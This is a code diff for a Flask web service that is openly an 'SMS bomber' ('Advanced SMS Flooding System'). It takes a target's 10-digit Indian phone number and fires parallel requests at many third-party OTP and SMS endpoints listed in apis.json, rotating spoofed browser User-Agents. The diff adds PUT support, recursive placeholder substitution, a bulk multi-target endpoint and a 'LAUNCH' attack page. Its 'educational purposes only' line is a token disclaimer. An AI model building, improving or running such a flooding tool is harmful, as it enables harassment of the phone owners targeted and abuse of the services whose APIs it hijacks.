@@ -1,20 +1,50 @@
-from flask import Flask, request, jsonify
+import json
+import random
+import time
+import os
 import requests
 import concurrent.futures
-import json
-import time
-import random
 from datetime import datetime
-import threading
-import os
+from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
 # Load APIs from JSON file
-with open('apis.json', 'r') as f:
-    APIS_DATA = json.load(f)
+def load_apis():
+    try:
+        with open('apis.json', 'r', encoding='utf-8') as f:
+            data = json.load(f)
+        
+        # Handle both list format and {"apis": [...]} format
+        if isinstance(data, dict) and "apis" in data:
+            return data["apis"]
+        return data
+    except FileNotFoundError:
+        print("Error: apis.json not found.")
+        return []
+    except json.JSONDecodeError:
+        print("Error: apis.json is not valid JSON.")
+        return []
 
-APIS = APIS_DATA["apis"]
+APIS = load_apis()
+
+def recursive_replace(data, phone):
+    """
+    Recursively replace placeholders in strings, dicts, and lists.
+    Handles: {no}, {phone}, {cc} (defaults to 91), {dur} (defaults to 60)
+    """
+    if isinstance(data, str):
+        # Replace placeholders
+        data = data.replace("{no}", phone)
+        data = data.replace("{phone}", phone)
+        data = data.replace("{cc}", "91")  # Defaulting to India Country Code
+        data = data.replace("{dur}", "60") # Defaulting duration
+        return data
+    elif isinstance(data, dict):
+        return {k: recursive_replace(v, phone) for k, v in data.items()}
+    elif isinstance(data, list):
+        return [recursive_replace(i, phone) for i in data]
+    return data
 
 def send_single_request(api_config, phone_number):
     """Send request to single API"""
@@ -29,47 +59,57 @@ def send_single_request(api_config, phone_number):
     try:
         start_time = time.time()
         
-        # Prepare URL
-        url = api_config["url"].replace("{phone}", phone_number)
+        # 1. Prepare URL (Handle placeholders)
+        url = api_config["url"]
+        url = recursive_replace(url, phone_number)
         
-        # Prepare headers
+        # 2. Prepare Headers
         headers = api_config.get("headers", {})
         
         # Add random User-Agent if not present
-        user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-        ]
-        
-        if "User-Agent" not in headers:
+        if "User-Agent" not in headers and "user-agent" not in headers:
+            user_agents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+                "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            ]
             headers["User-Agent"] = random.choice(user_agents)
         
-        # Prepare data
-        data = None
-        if api_config.get("data"):
-            data_str = api_config["data"].replace("{phone}", phone_number)
-            
-            if api_config.get("headers", {}).get("Content-Type", "").startswith("application/json"):
-                try:
-                    data = json.loads(data_str)
-                except:
-                    data = data_str
-            else:
-                data = data_str
+        # 3. Prepare Body (Handle 'body' key instead of 'data')
+        raw_body = api_config.get("body")
+        final_body = None
         
-        # Send request
+        if raw_body is not None:
+            # Recursively replace placeholders in the body structure
+            final_body = recursive_replace(raw_body, phone_number)
+
+        # 4. Determine Request Method and Payload Type
+        method = api_config.get("method", "POST").upper()
         timeout = random.randint(8, 12)
         
-        if api_config["method"] == "GET":
+        # Check if we should send JSON or Form data
+        # We look at the 'Content-Type' header.
+        content_type = headers.get("Content-Type", headers.get("content-type", ""))
+        
+        response = None
+        
+        if method == "GET":
             response = requests.get(url, headers=headers, timeout=timeout)
-        else:
-            if isinstance(data, dict):
-                response = requests.post(url, json=data, headers=headers, timeout=timeout)
+        
+        elif method == "PUT":
+            if isinstance(final_body, dict) and "application/json" in content_type:
+                response = requests.put(url, json=final_body, headers=headers, timeout=timeout)
             else:
-                response = requests.post(url, data=data, headers=headers, timeout=timeout)
+                response = requests.put(url, data=final_body, headers=headers, timeout=timeout)
+                
+        else: # Default to POST
+            if isinstance(final_body, dict) and "application/json" in content_type:
+                response = requests.post(url, json=final_body, headers=headers, timeout=timeout)
+            else:
+                # If final_body is a dict but content-type isn't json, requests converts it to form data
+                response = requests.post(url, data=final_body, headers=headers, timeout=timeout)
         
         end_time = time.time()
         
@@ -81,7 +121,7 @@ def send_single_request(api_config, phone_number):
                 
     except requests.exceptions.Timeout:
         result["status"] = "timeout"
-        result["message"] = "Request timeout after 10 seconds"
+        result["message"] = "Request timeout"
     except requests.exceptions.ConnectionError:
         result["status"] = "connection_error"
         result["message"] = "Connection failed"
@@ -96,21 +136,20 @@ def send_single_request(api_config, phone_number):
 
 @app.route('/api', methods=['GET'])
 def api_endpoint():
-    """Main API endpoint - Send SMS requests (Minimal response only)"""
+    """Main API endpoint - Send SMS requests"""
     phone_number = request.args.get('num')
     
     if not phone_number:
         return jsonify({
             "status": "error",
-            "message": "Phone number is required. Use /api?num=XXXXXXXXXX",
-            "example": "https://ab-bomb-api.vercel.app/api?num=1234567890"
+            "message": "Phone number is required. Use /api?num=XXXXXXXXXX"
         }), 400
     
-    # Validate phone number
+    # Validate phone number (10 digits)
     if not phone_number.isdigit() or len(phone_number) != 10:
         return jsonify({
             "status": "error",
-            "message": "Invalid phone number. Please provide 10-digit Indian number"
+            "message": "Invalid phone number. Please provide 10-digit number"
         }), 400
     
     try:
@@ -118,7 +157,6 @@ def api_endpoint():
         successful = 0
         failed = 0
         
-        # Get max workers parameter
         max_workers = int(request.args.get('workers', 10))
         
         # Send requests in parallel
@@ -192,7 +230,7 @@ def test_single():
 
 @app.route('/api/bulk', methods=['POST'])
 def bulk_requests():
-    """Bulk requests with custom configuration (Minimal response)"""
+    """Bulk requests with custom configuration"""
     try:
         data = request.json
         
@@ -270,12 +308,14 @@ def ping():
     return jsonify({
         "status": "alive",
         "timestamp": datetime.now().isoformat(),
-        "version": "1.0.0",
+        "version": "2.0.0",
         "total_apis": len(APIS)
     })
 
 @app.route('/')
 def home():
+    # Using a simplified HTML block to keep the code clean, 
+    # identical logic to the original but updated string replacements
     return """
     <!DOCTYPE html>
     <html>
@@ -284,420 +324,145 @@ def home():
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <style>
             :root {
-                --primary: linear-gradient(135deg, #8B0000 0%, #2F0000 100%);
-                --secondary: linear-gradient(135deg, #B22222 0%, #8B0000 100%);
-                --accent: linear-gradient(135deg, #FF2400 0%, #8B0000 100%);
-                --glass: rgba(0, 0, 0, 0.3);
-                --glass-border: rgba(255, 0, 0, 0.2);
-                --shadow: 0 8px 32px rgba(139, 0, 0, 0.5);
+                --primary: #0f0f0f;
+                --accent: #e50914; /* Netflix red style */
+                --text: #ffffff;
             }
-            
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-            
             body {
-                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-                background: var(--primary);
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                background-color: var(--primary);
+                color: var(--text);
+                display: flex;
+                flex-direction: column;
+                align-items: center;
                 min-height: 100vh;
-                overflow-x: hidden;
-                color: #fff;
+                margin: 0;
+                padding: 20px;
             }
-            
-            body::before {
-                content: '';
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: 
-                    radial-gradient(circle at 20% 80%, rgba(255, 0, 0, 0.2) 0%, transparent 50%),
-                    radial-gradient(circle at 80% 20%, rgba(178, 34, 34, 0.2) 0%, transparent 50%),
-                    radial-gradient(circle at 40% 40%, rgba(139, 0, 0, 0.2) 0%, transparent 50%);
-                z-index: -1;
-            }
-            
             .container {
-                max-width: 1200px;
-                margin: 0 auto;
-                padding: 20px;
-                position: relative;
-                z-index: 1;
-            }
-            
-            .header {
+                max-width: 800px;
+                width: 100%;
                 text-align: center;
-                margin-bottom: 40px;
-                padding: 40px 20px;
-                background: var(--glass);
-                backdrop-filter: blur(20px);
-                border-radius: 24px;
-                border: 1px solid var(--glass-border);
-                box-shadow: var(--shadow);
-                border: 2px solid rgba(255, 0, 0, 0.3);
             }
-            
-            .header h1 {
-                background: linear-gradient(45deg, #FF2400, #FF0000, #DC143C);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                background-clip: text;
-                font-size: clamp(2rem, 5vw, 3.5rem);
-                font-weight: 900;
-                margin-bottom: 12px;
-                letter-spacing: -0.02em;
-                text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+            h1 {
+                font-size: 3rem;
+                margin-bottom: 10px;
+                text-transform: uppercase;
+                letter-spacing: 2px;
             }
-            
-            .header p {
-                color: #FFB6C1;
+            .highlight { color: var(--accent); }
+            .card {
+                background: #1a1a1a;
+                border-radius: 10px;
+                padding: 30px;
+                margin-top: 30px;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            }
+            input[type="text"] {
+                padding: 15px;
                 font-size: 1.2rem;
-                font-weight: 400;
-                max-width: 600px;
-                margin: 0 auto;
-                line-height: 1.6;
-            }
-            
-            .api-count {
-                display: inline-flex;
-                align-items: center;
-                gap: 8px;
-                background: var(--secondary);
-                padding: 12px 24px;
-                border-radius: 50px;
-                margin-top: 20px;
-                font-weight: 900;
-                color: #FFD700;
-                box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5);
-                border: 2px solid rgba(255, 0, 0, 0.5);
-                text-transform: uppercase;
-                letter-spacing: 1px;
-                animation: pulse 2s infinite;
-            }
-            
-            @keyframes pulse {
-                0% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5); }
-                50% { box-shadow: 0 4px 40px rgba(255, 0, 0, 0.8); }
-                100% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5); }
-            }
-            
-            .endpoints-grid {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-                gap: 24px;
-                margin: 40px 0;
-            }
-            
-            .endpoint-card {
-                background: var(--glass);
-                backdrop-filter: blur(20px);
-                border: 1px solid var(--glass-border);
-                border-radius: 20px;
-                padding: 32px;
-                box-shadow: var(--shadow);
-                transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-                position: relative;
-                overflow: hidden;
-                border: 2px solid rgba(255, 0, 0, 0.3);
-            }
-            
-            .endpoint-card::before {
-                content: '';
-                position: absolute;
-                top: 0;
-                left: 0;
-                right: 0;
-                height: 4px;
-                background: var(--accent);
-            }
-            
-            .endpoint-card:hover {
-                transform: translateY(-12px);
-                box-shadow: 0 20px 40px rgba(255, 0, 0, 0.4);
-                border-color: rgba(255, 0, 0, 0.6);
-            }
-            
-            .endpoint-card h3 {
-                color: #FFB6C1;
-                margin-bottom: 16px;
-                font-size: 1.3rem;
-                font-weight: 700;
-                display: flex;
-                align-items: center;
-                gap: 12px;
-            }
-            
-            .method-badge {
-                padding: 6px 16px;
-                border-radius: 20px;
-                font-size: 0.8rem;
-                font-weight: 700;
-                text-transform: uppercase;
-                letter-spacing: 0.5px;
-                border: 1px solid rgba(255, 255, 255, 0.3);
-            }
-            
-            .method-get { 
-                background: linear-gradient(135deg, #DC143C, #B22222);
-                color: #FFD700;
-            }
-            
-            .method-post { 
-                background: linear-gradient(135deg, #8B0000, #660000);
-                color: #FFD700;
-            }
-            
-            .endpoint-code {
-                background: rgba(0, 0, 0, 0.5);
-                padding: 20px;
-                border-radius: 16px;
-                margin: 20px 0;
-                font-family: 'JetBrains Mono', 'Fira Code', monospace;
-                color: #FF6347;
-                border: 1px solid rgba(255, 0, 0, 0.2);
-                font-size: 0.95rem;
-                line-height: 1.6;
-                position: relative;
-            }
-            
-            .endpoint-card p {
-                color: #FFB6C1;
-                line-height: 1.6;
-                margin-bottom: 8px;
-            }
-            
-            .test-section {
-                background: var(--glass);
-                backdrop-filter: blur(20px);
-                border: 1px solid var(--glass-border);
-                border-radius: 24px;
-                padding: 40px;
-                margin: 40px 0;
-                box-shadow: var(--shadow);
-                text-align: center;
-                border: 2px solid rgba(255, 0, 0, 0.3);
-            }
-            
-            .test-section h2 {
-                background: linear-gradient(45deg, #FF2400, #FF0000);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                background-clip: text;
-                font-size: 2rem;
-                margin-bottom: 24px;
-                font-weight: 900;
-                text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-            }
-            
-            .test-form {
-                display: flex;
-                gap: 16px;
-                max-width: 500px;
-                margin: 0 auto 24px;
-                flex-wrap: wrap;
-            }
-            
-            .test-input {
-                flex: 1;
-                min-width: 250px;
-                padding: 16px 24px;
-                border: 2px solid rgba(255, 0, 0, 0.3);
-                border-radius: 16px;
-                font-size: 1.1rem;
-                background: rgba(0, 0, 0, 0.5);
-                backdrop-filter: blur(10px);
-                transition: all 0.3s ease;
-                font-family: inherit;
+                border-radius: 5px;
+                border: 2px solid #333;
+                background: #000;
                 color: #fff;
+                width: 70%;
+                margin-right: 10px;
             }
-            
-            .test-input::placeholder {
-                color: #FFB6C1;
-            }
-            
-            .test-input:focus {
-                outline: none;
-                border-color: #FF0000;
-                box-shadow: 0 0 0 4px rgba(255, 0, 0, 0.2);
-                transform: translateY(-2px);
-                background: rgba(0, 0, 0, 0.7);
-            }
-            
-            .test-button {
-                padding: 16px 32px;
-                background: var(--accent);
-                color: #FFD700;
+            button {
+                padding: 15px 30px;
+                font-size: 1.2rem;
+                background-color: var(--accent);
+                color: white;
                 border: none;
-                border-radius: 16px;
-                font-size: 1.1rem;
-                font-weight: 900;
+                border-radius: 5px;
                 cursor: pointer;
-                transition: all 0.3s ease;
-                box-shadow: 0 8px 25px rgba(255, 0, 0, 0.5);
+                font-weight: bold;
                 text-transform: uppercase;
-                letter-spacing: 1px;
-                border: 2px solid rgba(255, 215, 0, 0.3);
             }
-            
-            .test-button:hover {
-                transform: translateY(-4px);
-                box-shadow: 0 12px 35px rgba(255, 0, 0, 0.7);
-                background: linear-gradient(135deg, #FF0000, #DC143C);
-            }
-            
-            .test-button:disabled {
-                opacity: 0.6;
-                cursor: not-allowed;
-                transform: none;
-            }
-            
-            .response-box {
-                background: rgba(0, 0, 0, 0.7);
-                border-radius: 16px;
-                padding: 24px;
-                max-height: 400px;
-                overflow-y: auto;
-                border: 1px solid rgba(255, 0, 0, 0.2);
-                box-shadow: inset 0 2px 10px rgba(255, 0, 0, 0.1);
-                text-align: left;
+            button:hover { background-color: #b2070f; }
+            button:disabled { background-color: #555; cursor: not-allowed; }
+            #responseBox {
                 margin-top: 20px;
-                color: #FFB6C1;
+                padding: 15px;
+                background: #000;
+                border-radius: 5px;
+                min-height: 100px;
+                text-align: left;
+                white-space: pre-wrap;
+                font-family: monospace;
+                border: 1px solid #333;
             }
-            
-            .success { 
-                color: #32CD32;
-                font-weight: bold;
-                text-shadow: 0 0 10px rgba(50, 205, 50, 0.5);
-            }
-            
-            .error { 
-                color: #FF4500;
-                font-weight: bold;
-                text-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
-            }
-            
-            .loading { 
-                color: #FFD700;
-                font-weight: bold;
-            }
-            
-            .footer {
-                text-align: center;
-                padding: 40px 20px;
-                color: rgba(255, 182, 193, 0.9);
-                font-size: 0.95rem;
-                border-top: 1px solid rgba(255, 0, 0, 0.2);
-                margin-top: 40px;
-            }
-            
-            .warning {
-                color: #FFD700;
-                font-size: 0.9rem;
-                font-style: italic;
-                margin-top: 10px;
-                text-align: center;
-            }
-            
-            @media (max-width: 768px) {
-                .container { padding: 16px; }
-                .endpoints-grid { grid-template-columns: 1fr; }
-                .test-form { flex-direction: column; }
-                .test-input, .test-button { width: 100%; }
-            }
+            .stats { display: flex; justify-content: space-around; margin-top: 20px; }
+            .stat-box { text-align: center; }
+            .stat-number { font-size: 2rem; font-weight: bold; color: var(--accent); }
         </style>
-        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     </head>
     <body>
         <div class="container">
-            <div class="header">
-                <h1>ABBAS SMS BOMBER</h1>
-                <p>Advanced SMS flooding system - Use with extreme caution</p>
-                <div class="api-count">
-                    <span><strong>""" + str(len(APIS)) + """</strong> ACTIVE BOMBS</span>
-                </div>
-                <p class="warning">⚠️ WARNING: For educational purposes only. Misuse may result in legal consequences.</p>
-            </div>
+            <h1>PRINCE <span class="highlight">BOMBER</span></h1>
+            <p>Advanced SMS Flooding System</p>
             
-            <div class="endpoints-grid">
-                <div class="endpoint-card">
-                    <h3><span class="method-badge method-get">GET</span> FULL ASSAULT</h3>
-                    <div class="endpoint-code">/api?num=9876543210</div>
-                    <p>Launch all """ + str(len(APIS)) + """ attack vectors simultaneously</p>
-                </div>
+            <div class="card">
+                <input type="text" id="phoneNumber" placeholder="10 Digit Number" maxlength="10">
+                <button onclick="testAPI()" id="attackBtn">LAUNCH</button>
                 
-                <div class="endpoint-card">
-                    <h3><span class="method-badge method-get">GET</span> TARGETED STRIKE</h3>
-                    <div class="endpoint-code">/api/test?num=9876543210&api=Name</div>
-                    <p>Test individual attack vectors</p>
-                </div>
+                <div id="responseBox">Ready to attack...</div>
                 
-                <div class="endpoint-card">
-                    <h3><span class="method-badge method-post">POST</span> MASS ATTACK</h3>
-                    <div class="endpoint-code">/api/bulk</div>
-                    <p>Deploy attacks on multiple targets with custom configuration</p>
+                <div class="stats" id="stats" style="display:none;">
+                    <div class="stat-box">
+                        <div class="stat-number" id="successCount">0</div>
+                        <div>Success</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-number" id="failCount">0</div>
+                        <div>Failed</div>
+                    </div>
                 </div>
             </div>
             
-            <div class="test-section">
-                <h2>⚡ ENTER TARGET NUMBER</h2>
-                <div class="test-form">
-                    <input type="text" id="phoneNumber" class="test-input" placeholder="Enter 10-digit target number" maxlength="10">
-                    <button class="test-button" onclick="testAPI()">LAUNCH ATTACK</button>
-                </div>
-                <div class="response-box" id="responseBox">
-                    <p>Enter target number and click LAUNCH ATTACK to deploy all """ + str(len(APIS)) + """ bombs</p>
-                </div>
-            </div>
+            <p style="margin-top: 50px; font-size: 0.8rem; color: #666;">
+                Loaded APIs: """ + str(len(APIS)) + """ | For Educational Purposes Only
+            </p>
         </div>
-        
-        <div class="footer">
-            <p>SMS BOMBER v2.0 | WARNING: Use responsibly | ⚠️ STRICTLY FOR EDUCATIONAL PURPOSES</p>
-        </div>
-        
+
         <script>
             function testAPI() {
                 const phone = document.getElementById('phoneNumber').value.trim();
                 const responseBox = document.getElementById('responseBox');
-                const button = document.querySelector('.test-button');
+                const btn = document.getElementById('attackBtn');
+                const stats = document.getElementById('stats');
                 
-                if (!phone || phone.length !== 10 || !phone.match(/^[6-9]\\d{9}$/)) {
-                    responseBox.innerHTML = '<p class="error">❌ INVALID TARGET: Enter valid 10-digit Indian number</p>';
+                if (!phone || phone.length !== 10 || !/^[6-9]\\d{9}$/.test(phone)) {
+                    responseBox.innerHTML = '<span style="color: red;">Invalid Indian Number</span>';
                     return;
                 }
                 
-                button.disabled = true;
-                button.textContent = 'DEPLOYING...';
-                responseBox.innerHTML = '<p class="loading"> ATTACK START ' + """ + str(len(APIS)) + """ + ' ATTACK VECTORS...</p>';
-                
-                fetch(`/api?num=${phone}&workers=8`)
+                btn.disabled = true;
+                btn.textContent = 'FIRING...';
+                responseBox.textContent = 'Initializing attack vectors...';
+                stats.style.display = 'none';
+
+                fetch(`/api?num=${phone}&workers=20`)
                     .then(response => response.json())
                     .then(data => {
-                        let html = `<div class="success">✅ MISSION COMPLETE in ${data.total_time_seconds}s</div>`;
-                        html += `<p><strong>💣 TOTAL PAYLOADS:</strong> ${data.total_requests}</p>`;
-                        html += `<p><strong>✅ SUCCESSFUL HITS:</strong> ${data.successful}</p>`;
-                        html += `<p><strong>❌ FAILED LAUNCHES:</strong> ${data.failed}</p>`;
-                        html += `<p><strong>⏱️ MISSION TIME:</strong> ${data.total_time_seconds} seconds</p>`;
-                        html += `<p><strong>📅 TIMESTAMP:</strong> ${new Date(data.timestamp).toLocaleString()}</p>`;
+                        responseBox.innerHTML = '<span style="color: #4CAF50;">Attack Completed!</span>\\nTime: ' + data.total_time_seconds + 's';
                         
-                        responseBox.innerHTML = html;
+                        document.getElementById('successCount').innerText = data.successful;
+                        document.getElementById('failCount').innerText = data.failed;
+                        stats.style.display = 'flex';
                     })
                     .catch(error => {
-                        responseBox.innerHTML = `<p class="error">❌ SYSTEM ERROR: ${error.message}</p>`;
+                        responseBox.innerHTML = '<span style="color: red;">Error: ' + error.message + '</span>';
                     })
                     .finally(() => {
-                        button.disabled = false;
-                        button.textContent = 'LAUNCH ATTACK';
+                        btn.disabled = false;
+                        btn.textContent = 'LAUNCH';
                     });
             }
-            
-            // Auto-format phone input
-            document.getElementById('phoneNumber').addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\\D/g, '');
-                if (value.length > 10) value = value.slice(0, 10);
-                e.target.value = value;
+
+            // Input formatting
+            document.getElementById('phoneNumber').addEventListener('input', function (e) {
+                this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
             });
         </script>
     </body>
